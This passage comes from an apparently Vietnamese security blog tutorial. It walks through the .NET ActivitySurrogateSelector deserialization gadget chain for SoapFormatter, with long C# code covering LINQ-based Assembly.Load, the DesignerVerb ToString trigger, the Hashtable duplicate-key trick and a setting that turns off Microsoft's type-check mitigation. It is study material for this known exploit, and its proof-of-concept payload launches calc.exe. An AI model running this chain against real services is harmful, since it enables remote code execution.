trong class PersonSerializeSurrogate sẽ được thực thi trong quá trình serialization và deserialization. (Đây là kiến thức cơ bản, bạn có thể xem chi tiết tại đây)\nDo đó, chúng ta thấy, kết quả của p.Age được in ra là 0 thay vì 18 như trước đó. Lý do là vì chúng ta đã control quá trình serialize và deserialize của object p. Trong class PersonSerializeSurrogate, chỉ có field name được serialize và deserialize nên kết quả vẫn là Edisc. Còn giá trị của age là 0 vì đó là giá trị mặc định khi không được deserialize.\nMột tính năng của proxy selector cần lưu ý ở đây là: proxy selector có thể được dùng để serialization và deserialization bất kì class nào kể cả những class không đánh dấu serialized [Serializable]\nQuay lại ví dụ ban đầu, khi chúng ta sử dụng proxy selector, class Person implements the serialization interface (notation: [Serializable])\nNếu ta xóa đi notation: [Serializable]. Chương trình vẫn chạy, đây là một tính năng của việc chọn proxy.\nTrong quá trình deserialize, luôn có 1 quá trình xem xét liệu class có thể seralize hay không? Điều này dẫn tới một vấn đề: Một class được serialize nhưng khi deserialize nó không thể deserialize proxy selector được implement bởi chúng ta. Để hiểu rõ hơn, hãy sửa đổi một chút đoạn code ví dụ ban đầu như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 using System; using System.IO; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { //[Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } sealed class PersonSerializeSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { var p = (Person)obj; info.AddValue(\u0026#34;Name\u0026#34;, p.Name); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { var p = (Person)obj; p.Name = info.GetString(\u0026#34;Name\u0026#34;); return p; } } class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); var ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), new StreamingContext(StreamingContextStates.All), new PersonSerializeSurrogate()); soapFormatter.SurrogateSelector = ss; Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; MemoryStream stream = new MemoryStream(); // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; //Person p = (Person)soapFormatter.Deserialize(stream); //=================================== begin new code =================================== var fmt2 = new SoapFormatter(); Person p = (Person)fmt2.Deserialize(stream); //=================================== end new code =================================== Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); Console.ReadKey(); } } } Kết quả khi chạy chương trình:\nỞ đoạn code cũ, chúng ta dùng câu lệnh (dòng 64)\n1 Person p = (Person)soapFormatter.Deserialize(stream); Câu lệnh này sẽ sử dụng method SetObjectData() được định nghĩa trong class PersonSerializeSurrogate của chúng ta. Còn với đoạn code mới, object fmt2 sử dụng native deserialzation do đó, có lỗi xảy ra.\nLý do là khi parsing object trong deserializaed soap data, nó sẽ gọi method CheckSerializable đầu tiên để xác định xem liệu Object muốn parse có thể serializable không.\nClass Person trong đoạn mã không thể serialized do không implement interface ISerializable hoặc không có các thuộc tính được đánh dấu [Serializable]. Khi một object được serialize, nó cần đáp ứng một số yêu cầu để đảm bảo quá trình serialize và deserialize object được thực hiện thành công.\nTrong trường hợp này, class Person không implemnet ISerializable và không có thuộc tính [Serializable] . Do đó, object Person sẽ cố gắng serialize bằng cách sử dụng SoapFormatter, quá trình này không thành công và gây ra lỗi.\nĐể giải quyết vấn đề này, ta cần sử dụng class ActivitySurrogateSelector.\nIII ActivitySurrogateSelector Trong phần trước chúng ta đã biết có tồn tại một vấn đề: Một class được serialize nhưng khi deserialize nó không thể deserialize proxy selector được implement bởi chúng ta. Khi thực thi nó sẽ văng ra lỗi.\nVà cuối phần II, tôi đã đề cập vấn đề này có thể giải quyết bằng ActivitySurrogateSelector\nTrong phần này tôi sẽ tiến hành debug để hiểu rõ tại sao ActivitySurrogateSelector có thể giải quyết được.\n1. [background] ISerializationSurrogate and SurrogateSelector Với serialization và deserialization trong C#, chúng ta sẽ thấy có lúc dùng SurrogateSelector, có lúc thì implement ISerializationSurrogate. Vậy sự khác biệt giữa đúng là gì?\nVới ISerializationSurrogate, hãy quay lại ví dụ ở phần trước:\nDễ thấy, class PersonSerializeSurrogate của chúng ta implemnet lại interface ISerializationSurrogate. Hãy debug với DnSpy64: Đầu tiên, chúng ta chạy code để build ra file .exe\nLoad file .exe và các thư viện liên quan vào dnspy64\nĐặt breakpoint và nhấn F5, tại ô Executable, trỏ đến file .exe mà chúng ta muốn thực thi\nThế là debug thôi:\nÈo, DnSpy bảo là nên dùng bản 32bit để chạy. Vậy thì đổi thôi Ngon lành!! Vậy debug thôi Đặt breakpoint tại soapFormatter.Serialize(stream, person) Trace, ta sẽ thấy System.Runtime.Serialization.Formatters.Soap.WriteObjectInfo.InitSerialize() được gọi Đến dòng 79: Ta thấy field m_surrogates của SurrogateSelector có một element là SoapDeserialization.PersonSerializeSurrogate. Đây là class mà chúng ta implement!!!\nVới SurrogateSelector proxy selector,hãy chỉnh sửa ví dụ trước đó một tí:\nTrong ví dụ, dễ thấy đang có lỗi xảy ra ở dòng 59. Lý do là thiếu lib. Để fix lỗi này ta chỉ cần thêm thư viện System.Configuration\nTương tự với ở trên, ta cũng debug Nhìn vào đây, ta thấy SurrogateSelector chứa ISerializationSurrogate và tất cả các object của ISerializationSurrogate đều là member của field m_surrogates của SurrogateSelector. Vậy điều này có nghĩa gì?\nKhi chúng ta sử dụng surrogateSelector.GetSurrogate, chúng ta implement GetSurrogate method trong SurrogateSelector object. Method GetSurrogate này có thể bị overwrite.\n2. ActivitySurrogateSelector Bây giờ, hãy quay lại đoạn code ở phần SurrogateSelector\nTa thấy fmt2 không sử dụng proxy selector nhưng nó lại có thể deserialize mà không bị lỗi\nTại sao vậy nhỉ???\nCùng debug để hiểu rõ nguyên lý của ActivitySurrogateSelector. Tiếp tục với phần trước đó, ta có surrogateSelector chứa MySurrogateSelector\nĐặt breakpoint tại MySurrogateSelector và tiếp tục, sẽ thấy surrogateSelector.GetSurrogate() ở dòng 79 sẽ gọi MySurrogateSelector.GetSurrogate() Vì class Person không chỉ rõ được thuộc tính [Serializable] nên biến flag ở dòng 13 sẽ có giá trị true (vì type.IsSerializable=false). Do đó, nó sẽ vào dòng lệnh 17. Câu lệnh này sẽ trả về 1 instance của Object ObjectSurrogate Quay lại dòng lệnh 79 của InitSerialize(). Vì surrogateSelector và this.serializationSurrogate khác null, nên chương trình sẽ vào điều kiện rẽ nhánh 1 Tiếp tục chương trình, ta thấy dòng lệnh 84 được thực thi F11 để đi vào hàm bên trong, ta sẽ thấy nó đi vào hàm ObjectSurrogate.GetObjectData() Tiếp tục đến dòng 155, info set type ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef Mặt khác, ta thấy ObjectSerializedRef là một class có thể serialize được.\nTiếp tục chương trình, ta thấy [this.si](http://this.si) sẽ có ObjectType là **ObjectSerializedRef - một class có thể Serialize được.**\nDòng lệnh 86 và tiếp sau đó sẽ làm cho objectWriter trở thành 1 object có thể serialize\nTiếp tục chương trình Đến đây, giá trị stm đã là một serialized object. Do đó, chương trình sẽ tiếp tục mà không bị lỗi\nNOTE:\nTrong đoạn code có sử dụng câu lệnh:\n1 System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); Mục đích câu lệnh này là bypass hạn chế khi test trên các framework có version cao với vì Microsoft đã bản pacth từ phiên bản 4.8 trở đi.\nYeah, vậy là chúng ta đã hiểu tại sao ActivitySurrogateSelector thì không bị lỗi: bởi vì khi tới hàm Deserialize() thì stm đã được chuyển thành dạng serialize rồi.\nIV LINQ Knowledge Để hiểu được ActivitySurrogateSelector attack chain, ta cần biết 1 ít về Linq.\nTheo định nghĩa sách giáo khoa thì:\nThe official definition of Linq is Language Integrated Query (LINQ) is a series of technologies that directly integrate query functions into the C## language. It can be considered that Linq uses Lambda expressions to complete functions similar to SQL syntax.\nĐể hiểu rõ, ta đi qua ví dụ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public static void Main(string[] args) { var word = \u0026#34;hello from linq.\u0026#34;; var words = word.Split(\u0026#39; \u0026#39;); var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; Console.WriteLine(q1); foreach (var item in q1) { Console.WriteLine(item); } Console.ReadKey(); } khi chạy, output sẽ là và binary sau khi load vào dnspy sẽ được decompile như sau\nTrong đoạn code trên, câu lệnh:\n1 2 3 var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; Tôi tinh gọn nó như sau:\n1 words.Where(s =\u0026gt; s.ToLower().Contains(\u0026#39;o\u0026#39;)).Select(s=\u0026gt;s) Format để gọi như trên được định nghĩa như sau:\nĐể vào được định nghĩa như trên, tôi dùng extension GoToDnSpy. Khi ấn ctrl + click vào từ khóa where (Từ khóa Where trong C## là một phương thức được sử dụng trong thư viện LINQ), extension nafy sẽ dùng dnspy decompile code trong thư viện System.Linq (thư viện này hỗ trợ chạy LINQ) và show lên cho chúng ta\nnên khi decompile bằng DnSpy. Câu lệnh tương đương với dnspy là\n1 IEnumerable\u0026lt;string\u0026gt; q = Enumerable.Where\u0026lt;string\u0026gt;(words, (string s) =\u0026gt; Enumerable.Contains\u0026lt;char\u0026gt;(s.ToLower(), \u0026#39;o\u0026#39;)); Hãy phân tích một cấu trúc khai báo như sau: 1 public static IEnumerable\u0026lt;TSource\u0026gt; Where\u0026lt;TSource\u0026gt;(this IEnumerable\u0026lt;TSource\u0026gt; source, Func\u0026lt;TSource, bool\u0026gt; predicate) Đây là định nghĩa phương thức, cho biết tên của phương thức (Where), cách truy cập vào phương thức (public) và các tham số mà nó mong đợi:\npublic static: Điều này cho biết phương thức có thể được truy cập từ bất kỳ đâu trong chương trình và không cần một đối tượng của lớp để gọi phương thức này. IEnumerable\u0026lt;TSource\u0026gt;: Đây là kiểu dữ liệu trả về của phương thức. Nó cho biết phương thức sẽ trả về một chuỗi các phần tử kiểu TSource. Where\u0026lt;TSource\u0026gt;: Đây là một phương thức generic, được chỉ định bởi \u0026lt;TSource\u0026gt;, có nghĩa là nó có thể hoạt động với bất kỳ kiểu nào được chỉ định bởi người gọi. this IEnumerable\u0026lt;TSource\u0026gt; source: Đây là tham số đầu tiên có tên là source, đại diện cho bộ sưu tập đầu vào mà phép Where sẽ được thực hiện. Trong ví dụ, source đề cập đến một bộ sưu tập các phần tử, chẳng hạn như một danh sách hoặc một mảng. Func\u0026lt;TSource, bool\u0026gt; predicate: Đây là tham số thứ hai có tên là predicate. Đây là một delegate có kiểu Func\u0026lt;TSource, bool\u0026gt;, được sử dụng để xử lý bộ sưu tập và trả về bộ sưu tập kết quả sau khi xử lý. Delegate là gì?\nTrong ngôn ngữ lập trình C#, delegate là một kiểu dữ liệu đặc biệt, cho phép chúng ta tạo ra các tham chiếu đến phương thức. Nó giống như một con trỏ hàm trong các ngôn ngữ khác. Delegate có thể được sử dụng để tạo ra các biểu thức hàm (function expressions) và truyền chúng như các tham số cho các phương thức khác.\nQuay lại với ví dụ của chúng ta:\n1 words.Where(s =\u0026gt; s.ToLower().Contains(\u0026#39;o\u0026#39;)).Select(s=\u0026gt;s) Where() và Select() là hai phương thức được sử dụng trong LINQ. Where() thực hiện việc lọc các phần tử trong bộ sưu tập dựa trên một điều kiện được xác định bởi một biểu thức lambda. Trong ví dụ này, biểu thức lambda là s =\u0026gt; s.ToLower().Contains('o'), nghĩa là chỉ giữ lại các phần tử trong bộ sưu tập mà chứa ký tự \u0026lsquo;o\u0026rsquo;. Sau khi Where() hoàn thành, kết quả là một collection chứa các phần tử đã được lọc. Tiếp theo, Select() thực hiện việc chuyển đổi các phần tử trong collection thành một định dạng khác dựa trên một biểu thức lambda khác. Trong ví dụ này, biểu thức lambda là s =\u0026gt; s, nghĩa là giữ nguyên các phần tử trong bộ sưu tập. Khi hoàn thành Select(), chúng ta có collection cuối cùng, chứa các phần tử đã được lọc và chuyển đổi. Vì vậy, hai quá trình ủy quyền (Where() và Select()) hoạt động lần lượt trên input collectiono, xử lý và truyền các phần tử qua lại giữa các phương thức cho đến khi chúng được lọc và chuyển đổi thành output collection.\nMột điều lưu ý ở đây LINQ là kiểu delayed execution 1 2 3 var q1 = from s in words where s.ToLower().Contains(\u0026#39;o\u0026#39;) select s; Trong ví dụ trên, q1 là một biến dùng để lưu trữ truy vấn LINQ.\nTuy nhiên, việc khai báo q1 chỉ tạo ra một thể hiện của truy vấn, không thực hiện việc xử lý trực tiếp. Thực tế, việc thực hiện xử lý và trả về kết quả sẽ xảy ra khi chúng ta thực hiện việc chọn (select) trên q1. Khi chúng ta thực hiện việc chọn (select) trên q1, truy vấn LINQ sẽ được thực thi và kết quả sẽ được trả về. Điều này có nghĩa là LINQ thực hiện trì hoãn (delayed execution), tức là việc xử lý truy vấn không xảy ra ngay lập tức khi truy vấn được khai báo, mà sẽ diễn ra chỉ khi kết quả cần được truy xuất (ví dụ: khi chúng ta thực hiện việc chọn - select). Điều này giúp tối ưu hiệu suất của ứng dụng và giảm thiểu việc thực hiện không cần thiết của các truy vấn LINQ. Nghe thì có vẻ khó hiểu, ta hãy nhìn vào bức ảnh này (tôi sưu tầm trên internet)\nĐây là tính chất quan trọng mà chúng ta sẽ dùng cho ActivitySurrogateSelector attack chain.\nV Attack chain Trong ysoserial.net, SoapFormatter có nhiều chains. Trong blog này, tôi sẽ trình bày chain: ActivitySurrogateSelector\nYeah, tới đây chúng ta đã biết thêm:\nActivitySurrogateSelector để select 1 proxy, hỗ trợ deserialize 1 class bất kì (không cần tag [Serializable]) Ngôn ngữ LINQ là có một tính chất delayed execution Vậy những thứ này giúp ích điều gì?\nMột chút về Java deserialize:\nỨng dụng RMI trong Java sẽ thực thi Runtime.exec() trong constructor, và thực hiện malicious code sau khi load class\nTương tự trong C#:\nNếu chúng ta có thể load một assembly riêng lên, thì việc kích hoạt constructor() khi tạo một instance mới cũng sẽ thực thi malicious code.\nNếu chúng ta thay thế delegate trong LINQ, load assembly và tạo một instance bằng cách thay thế delegate, thì malicous code sẽ được thực thi sau khi kích hoạt LINQ.\nTừ ý tưởng này, Researcher James Forshaw đã thiết kế một chain deserialize như sau\n1. IEnumerable to LINQ exploit chaining Chain của James Forshaw như sau:\n1 2 3 byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] Chain trên sử dụng LINQ delegate để gọi các process từ interface IEnumerable\n1 public static IEnumerable\u0026lt;TResult\u0026gt; Select\u0026lt;TSource, TResult\u0026gt;(this IEnumerable\u0026lt;TSource\u0026gt; source, Func\u0026lt;TSource, TResult\u0026gt; selector); Đầu tiên: byte[] -\u0026gt; Assembly.Load(byte[]) -\u0026gt; Assembly được implement bởi đoạn code sau, trong đó e1 là một Asembly object.\n1 2 3 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); Bước 2: Assembly -\u0026gt; Assembly.GetType() -\u0026gt; Type[] được implement thông qua đoạn code sau, trong đó, object e2 có type là IEnumerable\n1 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly,IEnumerable\u0026lt;Type\u0026gt;\u0026gt;),typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); Bước 3: Type[] -\u0026gt; Activator.CreateInstance(Type[]) -\u0026gt; object[] được hiện hiện thực như sau, trong đó e3 có type là IEnumerable\n1 var e3 = e2.Select(Activator.CreateInstance); Do đó, chain của James Forshaw được hiện thực bởi đoạn code như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 using System; using System.Collections.Generic; using System.IO; using System.Linq; using System.Reflection; namespace LinqBasic { internal class Program { public static void Main(string[] args) { // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step3 var e3 = e2.Select(Activator.CreateInstance); } } } Ngoài ra, ExploitClass tại dòng 17 sẽ được implemnt đơn giản như sau\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 using System; namespace LinqBasic { internal class ExploitClass { public ExploitClass() { try { // Payload code to be executed System.Diagnostics.Process.Start(\u0026#34;calc.exe\u0026#34;); } catch (Exception) { } } } } Perfect, chạy thôi!!!!\nỦa alo!!!! Calculator đâu?? Sau một hồi suy nghĩ tôi chợt nhớ!\nLINQ có tính chất delay execution!\nNghĩa là khi nào được sử dụng nó mới thực thi. Có khi ở bước này, LINQ chưa được sử dụng. Tạm thời cho là vậy và đi tiếp thôi\n2. Fom ToString to IEnumerable Nếu các bạn đã đi qua PHP-deserialize thì __tostring() là một trong những magic method thông dụng (sau __wakeup(), __destruct()) được dùng để khai thác lỗ hổng php deserialize. Với chain này trong .Net, James Forshaw cũng lấy ý tưởng như vậy:\nTìm cách trigger ToString() khi deserialize Tìm chain từ ToString() gọi đến IEnumerable Cùng xem xét đoạn code sau:\n1 2 3 4 5 6 7 8 9 10 11 12 // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); Trong đoạn code trên, e3 có kiểu là IEnumerable (biến ở đoạn code ví dụ ở phần V.1) và mục đích của đoạn code này là dùng reflection để set giá trị verb.properties=dict Tại sao lại như vậy nhỉ???\nĐầu tiên, ta đi xem sơ qua cấu trúc của các kiểu dữ kiệu trong đoạn code trên\nPageDataSource IDictionary DesignerWeb kế thừa MenuCommand Trong MenuCommand thì chú ý tới dòng 17 Từ những dữ kiện trên, tôi đơn giản thành đoạn code như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class MenuCommand { private IDictionary properties; // ...other members and methods... } public class DesignerVerb : MenuCommand { private string name; // ...other members and methods... public DesignerVerb(string name, IDictionary properties) { this.name = name; this.properties = properties; } public override string ToString() { // ...implementation... } } và nhìn lại đoạn code mà chúng ta cần phân tích\n1 2 3 4 PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); Dòng 1 đơn giản là tạo 1 instance PagedDataSource với DataSource = e3 (e3 là LINQ ở phần V.1)\nDòng 2 tạo 1 instance của AggregateDictionary (là một IDictionary), sử dụng reflection và gán vào dict và dùng biến pds ở dòng 1 làm tham số có constructor.\nDòng 3: tạo một DesignerVerb có tên là “XYZ” và không gán giá trị cho properties\nDòng 4: dùng reflection truy cập tới private field properties của class MenuCommand. Sau đó, gán giá trị properties của verb là dict.\nLưu ý:\nverb là instance của DesignerVerb DesignerVerb kế thừa properties từ MenuCommand properties là 1 private trong MenuCommand ⇒ dùng reflection truy cập vào properties của MenuCommand nhưng set value thì của verb.\nĐể gọi ToString() method thì chỉ cần dùng verb.ToString()\nOke, chạy thử thôi\nGòi gòi đây gòi!! Ca cu lay tờ của tui đây rồi.!!\nCó nghĩa đến đây, ToString() đã trigger LINQ, ExploitClass được thực thi và calc đã được bật. Đi tiếp thôi.\n3. HashTable to ToString Chúng ta đã thành công từ việc dùng ToString() để trigger LINQ, execute malicious code để popup calc Phần này chúng ta sẽ giải quyết vấn đề còn lại: Làm sao để trigger ToString() trong quá trình deserialize (verb.ToString() ở cuối phần trước chỉ là dùng để chứng mình ta thành công trong việc ToString() đến execute calc). Và solution ở đây là dùng HashTable FUN: Thấy HashTable làm tôi nghĩ ngay tới các commonsCollection trong Java Deserialize, HashTable cũng được dùng trong cc7\nHãy xem HashTable có gì?\nTrong HashTable có một method public virtual void OnDeserialization(object sender);Dùng dnspy để xem\nTrong quá trình Deserialize, HashTable sẽ rebuild lại tập key và insert.\nTrong Insert(), nếu như key bị duplicated, chương trình deserialize fail, quăng ra lỗi\nBlock_12:\nVà Environment.GetResourceString() được gọi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); ht.Add(verb, \u0026#34;\u0026#34;); ht.Add(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;); FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); Đoạn code trên dùng reflection để sửa giá trị của buckets field và replace the key là string với verb để 2 key trùng nhau ⇒ hash trùng nhau ⇒ lỗi sẽ trigger ⇒ trigger ToString như phân tích ở trên.\n4. System.Windows.Forms.AxHost.State handling Ở phần trước ta thấy mọi thứ có vẻ hoàn hảo:\nChúng ta đã tìm được cách trigger ToString() trong quá trình deserialize Tìm được chain từ ToString() trigger Linq Từ LINQ trigger malicious code. Bây giờ kết hợp mọi thứ lại và chạy kiểm tra\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 using System; using System.Collections; using System.Collections.Generic; using System.ComponentModel.Design; using System.Data; using System.IO; using System.Linq; using System.Reflection; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Binary; using System.Runtime.Serialization.Formatters.Soap; using System.Web.UI.WebControls; namespace LinqBasic { class MySurrogateSelector : SurrogateSelector { public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector) { selector = this; if (!type.IsSerializable) { Type t = Type.GetType(\u0026#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#34;); return (ISerializationSurrogate)Activator.CreateInstance(t); } return base.GetSurrogate(type, context, out selector); } } [Serializable] public class PayloadClass : ISerializable { public byte[] GadgetChains() { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); // Build a chain to map a byte array to creating an instance of a class. // byte[] -\u0026gt; Assembly.Load -\u0026gt; Assembly -\u0026gt; Assembly.GetType -\u0026gt; Type[] -\u0026gt; Activator.CreateInstance -\u0026gt; Win! // step 1 List\u0026lt;byte[]\u0026gt; data = new List\u0026lt;byte[]\u0026gt;(); data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location)); var e1 = data.Select(Assembly.Load); // step 2 Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt; map_type = (Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;)Delegate.CreateDelegate(typeof(Func\u0026lt;Assembly, IEnumerable\u0026lt;Type\u0026gt;\u0026gt;), typeof(Assembly).GetMethod(\u0026#34;GetTypes\u0026#34;)); var e2 = e1.SelectMany(map_type); // step 3 var e3 = e2.Select(Activator.CreateInstance); // PagedDataSource maps an arbitrary IEnumerable to an ICollection PagedDataSource pds = new PagedDataSource() { DataSource = e3 }; // AggregateDictionary maps an arbitrary ICollection to an IDictionary // Class is internal so need to use reflection. IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType(\u0026#34;System.Runtime.Remoting.Channels.AggregateDictionary\u0026#34;), pds); // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked. DesignerVerb verb = new DesignerVerb(\u0026#34;XYZ\u0026#34;, null); // Need to insert IDictionary using reflection. typeof(MenuCommand).GetField(\u0026#34;properties\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict); // Pre-load objects, this ensures they\u0026#39;re fixed up before building the hash table. List\u0026lt;object\u0026gt; ls = new List\u0026lt;object\u0026gt;(); ls.Add(e1); ls.Add(e2); ls.Add(e3); ls.Add(pds); ls.Add(verb); ls.Add(dict); Hashtable ht = new Hashtable(); // Add two entries to table. ht.Add(verb, \u0026#34;Hello\u0026#34;); ht.Add(\u0026#34;Dummy\u0026#34;, \u0026#34;Hello2\u0026#34;); // reflection to change buckets FieldInfo fi_keys = ht.GetType().GetField(\u0026#34;buckets\u0026#34;, BindingFlags.NonPublic | BindingFlags.Instance); Array keys = (Array)fi_keys.GetValue(ht); FieldInfo fi_key = keys.GetType().GetElementType().GetField(\u0026#34;key\u0026#34;, BindingFlags.Public | BindingFlags.Instance); for (int i = 0; i \u0026lt; keys.Length; ++i) { object bucket = keys.GetValue(i); object key = fi_key.GetValue(bucket); if (key is string) { fi_key.SetValue(bucket, verb); keys.SetValue(bucket, i); break; } } fi_keys.SetValue(ht, keys); ls.Add(ht); BinaryFormatter fmt1 = new BinaryFormatter(); MemoryStream stm = new MemoryStream(); fmt1.SurrogateSelector = new MySurrogateSelector(); fmt1.Serialize(stm, ls); return stm.ToArray(); } public void GetObjectData(SerializationInfo info, StreamingContext context) { System.Diagnostics.Trace.WriteLine(\u0026#34;In GetObjectData\u0026#34;); //info.SetType(typeof(System.Windows.Forms.AxHost.State)); //info.AddValue(\u0026#34;PropertyBagBinary\u0026#34;, GadgetChains()); } } class Program { static void Main(string[] args) { System.Configuration.ConfigurationManager.AppSettings.Set(\u0026#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck\u0026#34;, \u0026#34;true\u0026#34;); SoapFormatter fmt1 = new SoapFormatter(); SoapFormatter fmt2 = new SoapFormatter(); MemoryStream stm = new MemoryStream(); PayloadClass test = new PayloadClass(); fmt1.SurrogateSelector = new MySurrogateSelector(); //fmt1.Serialize(stm, test.GadgetChains()); fmt1.Serialize(stm, test); stm.Seek(0, SeekOrigin.Begin); fmt2.Deserialize(stm); } } } Ôi Khoan!! có lỗi ở đây.\nĐến thời điểm này tôi cũng không biết vì sao. Tuy nhiên, tôi thấy bộ công cụ nổi tiếng ysoserial.net sử dụng System.Windows.Forms.AxHost.State handling để xử lý phần lỗi xảy ra ở chain này\nCụ thể, khi thêm phần handling của System.Windows.Forms.AxHost.State:\nKhi enumerator.Name = PropertyBagBinary, câu lệnh tại dòng 7228 được thực thi Đến đây thì stream sẽ được deserialize. Đây cũng là endpoint của 1 chain khác AxHostState attack chain Nhưng như thế thì liên quan gì đến đoạn code ban đầu của chúng ta? Tại sao không thêm đoạn này thì lại bị lỗi? Điều chúng ta cần đâu phải hàm Deserialize này vì trong đoạn code đã deserialize rồi mà??\nTôi quyết định dùng DNSpy để decode.Chương trình đã vào phần xử lý lỗi khi deserialize Hashtable vì duplicate.\nCứ tiếp tục và thấy\noh, Tôi đã hiểu! Các bạn còn nhớ để trigger ToString() 